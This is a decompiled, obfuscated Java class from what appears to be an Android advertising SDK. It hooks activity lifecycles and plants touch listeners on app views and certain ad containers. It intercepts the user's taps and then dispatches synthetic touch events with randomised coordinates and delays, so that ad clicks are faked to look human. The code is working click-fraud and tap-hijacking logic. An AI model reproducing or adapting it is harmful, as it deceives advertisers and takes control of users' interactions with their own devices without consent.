package com.ubixnow.ooooo;

import android.app.Activity;
import android.app.Application;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.text.TextUtils;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import com.huawei.openalliance.ad.views.PPSLabelView;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Random;

/* JADX INFO: loaded from: C:\Users\MR\AppData\Local\Temp\yixiaotong-dex\6464928.dex */
public class o0O0O0O {
    public static o0O00o00 OooO00o = null;
    private static String OooO0O0 = "-------WindowManager";
    private static ViewGroup OooO0OO;
    private static int OooO0Oo;
    private static boolean OooO0o0;

    public class OooO implements Runnable {
        public final /* synthetic */ long[] OooO00o;
        public final /* synthetic */ int OooO0O0;
        public final /* synthetic */ int[] OooO0OO;
        public final /* synthetic */ int OooO0Oo;
        public final /* synthetic */ View OooO0o;
        public final /* synthetic */ int[] OooO0o0;

        public OooO(long[] jArr, int i, int[] iArr, int i2, int[] iArr2, View view) {
            this.OooO00o = jArr;
            this.OooO0O0 = i;
            this.OooO0OO = iArr;
            this.OooO0Oo = i2;
            this.OooO0o0 = iArr2;
            this.OooO0o = view;
        }

        @Override // java.lang.Runnable
        public void run() {
            long[] jArr = this.OooO00o;
            jArr[0] = jArr[0] + 5 + ((long) this.OooO0O0);
            int[] iArr = this.OooO0OO;
            int i = iArr[0];
            Random random = new Random();
            int i2 = this.OooO0Oo;
            iArr[0] = i + random.nextInt((i2 == 1 || i2 == 17) ? 5 : 20);
            int[] iArr2 = this.OooO0o0;
            int i3 = iArr2[0];
            Random random2 = new Random();
            int i4 = this.OooO0Oo;
            iArr2[0] = i3 + random2.nextInt((i4 == 1 || i4 == 17) ? 5 : 20);
            long j = this.OooO00o[0];
            MotionEvent motionEventObtain = MotionEvent.obtain(j, j, 1, this.OooO0OO[0], this.OooO0o0[0], 0);
            this.OooO0o.dispatchTouchEvent(motionEventObtain);
            motionEventObtain.recycle();
        }
    }

    public class OooO00o implements Runnable {
        public final /* synthetic */ ViewGroup OooO00o;
        public final /* synthetic */ String OooO0O0;
        public final /* synthetic */ oo00o OooO0OO;

        public OooO00o(ViewGroup viewGroup, String str, oo00o oo00oVar) {
            this.OooO00o = viewGroup;
            this.OooO0O0 = str;
            this.OooO0OO = oo00oVar;
        }

        @Override // java.lang.Runnable
        public void run() {
            try {
                o0OO0 o0oo0 = new o0OO0();
                o0oo0.OooOO0O = this.OooO00o;
                o0oo0.OooOOO = this.OooO0O0;
                o0oo0.OooOOO0 = 2;
                o0OO0O0.OooO oooO = o0OO0O0.OooO.LARGE;
                o0oo0.OooOO0o = oooO;
                o0oo0.OooOOOo = o0OO000.OooO00o(this.OooO0OO);
                o0oo0.OooOO0o = oooO;
                new o0OO0O0().OooO00o(o0oo0, o0O0O0O.OooO00o.OooO00o().get(0));
            } catch (Exception e) {
                ooooO000.OooO00o(e);
            }
        }
    }

    public class OooO0O0 implements View.OnTouchListener {
        public final /* synthetic */ HashMap OooO00o;
        public final /* synthetic */ int OooO0O0;
        public final /* synthetic */ int OooO0OO;
        public final /* synthetic */ int OooO0Oo;

        public class OooO00o implements Runnable {
            public OooO00o() {
            }

            @Override // java.lang.Runnable
            public void run() {
                int i = OooO0O0.this.OooO0O0;
                ViewGroup viewGroup = o0O0O0O.OooO0OO;
                OooO0O0 oooO0O0 = OooO0O0.this;
                o0O0O0O.OooO0O0(i, viewGroup, oooO0O0.OooO0OO, oooO0O0.OooO0Oo, oooO0O0.OooO00o);
            }
        }

        public OooO0O0(HashMap map, int i, int i2, int i3) {
            this.OooO00o = map;
            this.OooO0O0 = i;
            this.OooO0OO = i2;
            this.OooO0Oo = i3;
        }

        @Override // android.view.View.OnTouchListener
        public boolean onTouch(View view, MotionEvent motionEvent) {
            if (motionEvent.getAction() == 1) {
                this.OooO00o.put(o0OO000o.o00O00, motionEvent.getRawX() + "_" + motionEvent.getRawY());
                if (!o0O0O0O.OooO0o0) {
                    new Handler(Looper.getMainLooper()).postDelayed(new OooO00o(), 300L);
                    boolean unused = o0O0O0O.OooO0o0 = true;
                    return true;
                }
            }
            return false;
        }
    }

    public class OooO0OO implements View.OnTouchListener {
        public final /* synthetic */ HashMap OooO00o;
        public final /* synthetic */ int OooO0O0;
        public final /* synthetic */ int OooO0OO;
        public final /* synthetic */ int OooO0Oo;

        public class OooO00o implements Runnable {
            public OooO00o() {
            }

            @Override // java.lang.Runnable
            public void run() {
                int i = OooO0OO.this.OooO0O0;
                ViewGroup viewGroup = o0O0O0O.OooO0OO;
                OooO0OO oooO0OO = OooO0OO.this;
                o0O0O0O.OooO0O0(i, viewGroup, oooO0OO.OooO0OO, oooO0OO.OooO0Oo, oooO0OO.OooO00o);
            }
        }

        public OooO0OO(HashMap map, int i, int i2, int i3) {
            this.OooO00o = map;
            this.OooO0O0 = i;
            this.OooO0OO = i2;
            this.OooO0Oo = i3;
        }

        @Override // android.view.View.OnTouchListener
        public boolean onTouch(View view, MotionEvent motionEvent) {
            if (motionEvent.getAction() == 1) {
                this.OooO00o.put(o0OO000o.o00O00, motionEvent.getRawX() + "_" + motionEvent.getRawY());
                if (!o0O0O0O.OooO0o0) {
                    new Handler(Looper.getMainLooper()).postDelayed(new OooO00o(), 300L);
                    boolean unused = o0O0O0O.OooO0o0 = true;
                    return true;
                }
            }
            return false;
        }
    }

    public class OooO0o implements View.OnTouchListener {
        public final /* synthetic */ HashMap OooO00o;
        public final /* synthetic */ int OooO0O0;
        public final /* synthetic */ int OooO0OO;
        public final /* synthetic */ int OooO0Oo;

        public class OooO00o implements Runnable {
            public OooO00o() {
            }

            @Override // java.lang.Runnable
            public void run() {
                int i = OooO0o.this.OooO0O0;
                ViewGroup viewGroup = o0O0O0O.OooO0OO;
                OooO0o oooO0o = OooO0o.this;
                o0O0O0O.OooO0O0(i, viewGroup, oooO0o.OooO0OO, oooO0o.OooO0Oo, oooO0o.OooO00o);
            }
        }

        public OooO0o(HashMap map, int i, int i2, int i3) {
            this.OooO00o = map;
            this.OooO0O0 = i;
            this.OooO0OO = i2;
            this.OooO0Oo = i3;
        }

        @Override // android.view.View.OnTouchListener
        public boolean onTouch(View view, MotionEvent motionEvent) {
            ooooO000.OooO0O0("-------onTouch", "-----isClick View: " + o0O0O0O.OooO0o0 + " x:" + motionEvent.getX() + " Y:" + motionEvent.getY() + PPSLabelView.Code + motionEvent.getRawX() + o0O0O0O.OooO0OO.getClass());
            if (motionEvent.getAction() != 1) {
                return !o0O0O0O.OooO0o0;
            }
            if (o0O0O0O.OooO0o0) {
                this.OooO00o.clear();
                return false;
            }
            this.OooO00o.put(o0OO000o.o00O00, motionEvent.getRawX() + "_" + motionEvent.getRawY());
            new Handler(Looper.getMainLooper()).postDelayed(new OooO00o(), 300L);
            boolean unused = o0O0O0O.OooO0o0 = true;
            return true;
        }
    }

    public static View OooO00o(int i, View view, int i2, int i3, int i4, HashMap<String, String> map) {
        View.OnTouchListener oooO0o;
        int i5 = 0;
        OooO0o0 = false;
        if (i == 18) {
            if (view.getClass().toString().contains("MBRelativeLayout") || view.getClass().toString().contains("WindVaneWebView")) {
                if (OooO0Oo == 1) {
                    view.setOnTouchListener(new OooO0O0(map, i, i3, i4));
                }
                return view;
            }
            if (OooO0Oo == 0) {
                OooO0O0(i, OooO0OO, i3, i4, map);
                return OooO0OO;
            }
        }
        if (view instanceof ViewGroup) {
            int i6 = i2 + 1;
            while (true) {
                ViewGroup viewGroup = (ViewGroup) view;
                if (i5 >= viewGroup.getChildCount()) {
                    break;
                }
                OooO00o(i, viewGroup.getChildAt(i5), i6, i3, i4, map);
                i5++;
            }
            if ((i != 1 && i != 17) || view.getVisibility() != 0) {
                return null;
            }
            oooO0o = new OooO0OO(map, i, i3, i4);
        } else {
            if (view.getHeight() >= 150) {
                return null;
            }
            oooO0o = new OooO0o(map, i, i3, i4);
        }
        view.setOnTouchListener(oooO0o);
        return null;
    }

    public static List<View> OooO00o(int i, int i2, int i3, int i4, HashMap<String, String> map) {
        OooO0Oo = i4;
        ArrayList arrayList = new ArrayList();
        ooooO000.OooO0O0(OooO0O0, " getActivities size " + OooO00o.OooO00o().size());
        for (int i5 = 0; i5 < OooO00o.OooO00o().size(); i5++) {
            arrayList.add(OooO00o.OooO00o().get(i5).getWindow().getDecorView());
        }
        if (OooO00o.OooO00o().size() > 0) {
            ooooO000.OooO0O0("-------ActLifecycle", i2 + " ---performC" + OooO00o.OooO00o().get(0).getLocalClassName());
            OooO00o(i, OooO00o.OooO00o().get(0), i2, i3, map);
            return null;
        }
        List<View> listOooO00o = o0oO0O0o.OooO00o(i, i2, i3, i4, map);
        ooooO000.OooO0O0(OooO0O0, "------mViews " + listOooO00o.size() + PPSLabelView.Code + listOooO00o.getClass());
        return null;
    }

    public static List<View> OooO00o(Activity activity) {
        try {
            ooooO000.OooO0O0(OooO0O0, " getActivities size " + OooO00o.OooO00o().size());
            o0oO0O0o.OooO0O0(activity);
            return null;
        } catch (Exception unused) {
            return null;
        }
    }

    private static void OooO00o(int i, Activity activity, int i2, int i3, HashMap<String, String> map) {
        OooO0OO = (ViewGroup) activity.getWindow().getDecorView();
        ooooO000.OooO0O0(OooO0O0, "------mViews activityClick  " + OooO0Oo + " x:" + i2 + PPSLabelView.Code + i3);
        int i4 = OooO0Oo;
        if (i4 == 0) {
            if ((i == 18 ? OooO00o(i, OooO0OO, 0, i2, i3, map) : null) == null) {
                OooO0O0(i, OooO0OO, i2, i3, map);
            }
        } else if (i4 == 1) {
            OooO00o(i, OooO0OO, 0, i2, i3, map);
        }
    }

    public static void OooO00o(Application application) {
        if (OooO00o == null) {
            o0O00o00 o0o00o00 = new o0O00o00();
            OooO00o = o0o00o00;
            application.registerActivityLifecycleCallbacks(o0o00o00);
        }
    }

    public static void OooO00o(o0O00o00.OooO00o oooO00o) {
        o0O00o00 o0o00o00 = OooO00o;
        if (o0o00o00 != null) {
            o0o00o00.OooO00o(oooO00o);
        }
    }

    public static void OooO00o(oo00o oo00oVar) {
        try {
            String str = oo00oVar.getBaseAdConfig().OooOOO0.Oooo0oO;
            if (OooO00o.OooO00o().size() <= 0 || TextUtils.isEmpty(str)) {
                return;
            }
            ViewGroup viewGroup = (ViewGroup) OooO00o.OooO00o().get(0).getWindow().getDecorView();
            viewGroup.post(new OooO00o(viewGroup, str, oo00oVar));
        } catch (Exception unused) {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static void OooO0O0(int i, View view, int i2, int i3, HashMap<String, String> map) {
        long[] jArr = {SystemClock.uptimeMillis()};
        int[] iArr = {i2};
        int[] iArr2 = {i3};
        map.put(o0OO000o.o00O00Oo, "1");
        ooooO000.OooO0O0(OooO0O0, "-------clickEvent dispatchTouchEvent x " + iArr[0] + " Y:" + iArr2[0]);
        long j = jArr[0];
        MotionEvent motionEventObtain = MotionEvent.obtain(j, j, 0, iArr[0], iArr2[0], 0);
        view.dispatchTouchEvent(motionEventObtain);
        motionEventObtain.recycle();
        int iNextInt = new Random().nextInt(20) + 5;
        ooooO000.OooO0O0(OooO0O0, "------timeRandom: " + iNextInt);
        new Handler(Looper.getMainLooper()).postDelayed(new OooO(jArr, iNextInt, iArr, i, iArr2, view), iNextInt);
    }
}
